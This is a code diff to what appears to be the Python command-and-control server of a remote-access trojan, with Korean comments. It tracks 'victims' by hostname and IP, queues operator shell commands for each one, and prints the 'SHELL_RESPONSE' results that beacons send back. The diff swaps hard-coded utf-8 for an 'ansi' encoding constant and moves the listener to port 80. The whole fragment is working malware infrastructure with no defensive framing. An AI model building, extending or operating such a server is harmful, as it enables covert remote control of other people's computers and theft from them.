@@ -66,13 +66,13 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
         print('==parsed data==')
         for header, value in parsed_data.items():
             if header == 'data':
-                value = value.decode('utf-8')
+                value = value.decode(ENCODING)
             print('{0} : {1}'.format(header, value))
 
     # 기본 헤더 정의
     def _set_header(self, header={}):
         self.send_response(200)
-        self.send_header('Content-Type', 'text/plain; charset=utf-8')
+        self.send_header('Content-Type', 'text/plain; charset={}'.format(ENCODING))
 
         if len(header) > 0:
             for k, v in header.items():
@@ -176,7 +176,7 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
             else:
                 self._becon_ack_response()
         elif parsed_data['type'] == 'SHELL_RESPONSE': # SHELL_RESPONSE
-            print('[*] execute result\n{}'.format(parsed_data['data'].decode('utf-8')))
+            print('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
             self._becon_ack_response()
         else:
             self._becon_ack_response()
@@ -190,7 +190,10 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
 
 # 서버 주소와 포트
 # 자신의 ip, port로 설정
-SERVER_INFO = ('192.168.21.1', 2022)
+SERVER_INFO = ('192.168.21.1', 80)
+
+# encoding
+ENCODING = 'ansi'
 
 # 피해자 ip 및 여러 정보들을 담을 딕셔너리
 VICTIM_LIST = {} # hostname : ip 
@@ -205,7 +208,7 @@ print(menu_message)
 
 # hostname와 매칭하여 사용자가 입력한 command를 큐에 저장
 def add_command(victim_name, command):
-    COMMAND_QUEUE[VICTIM_LIST[victim_name]].append(bytes(command, 'utf-8'))
+    COMMAND_QUEUE[VICTIM_LIST[victim_name]].append(bytes(command, ENCODING))
 
 # victim 목록 출력
 def print_victims():
